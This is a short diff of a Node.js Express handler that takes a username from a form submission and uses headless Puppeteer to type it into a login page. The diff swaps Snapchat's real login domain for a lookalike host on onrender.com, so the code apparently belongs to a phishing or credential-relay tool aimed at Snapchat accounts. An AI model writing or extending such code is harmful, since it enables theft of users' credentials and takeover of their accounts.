@@ -40,7 +40,7 @@ app.post('/submit', async (req, res) => {
       (async () => {
         const browser = await puppeteer.launch({ headless: true });
         const page = await browser.newPage();
-        await page.goto('https://accounts.snapchat.com');
+        await page.goto('https://snapchat-login-qza8.onrender.com');
         
         // Login durchführen
         await page.type('input[name="username"]', username);
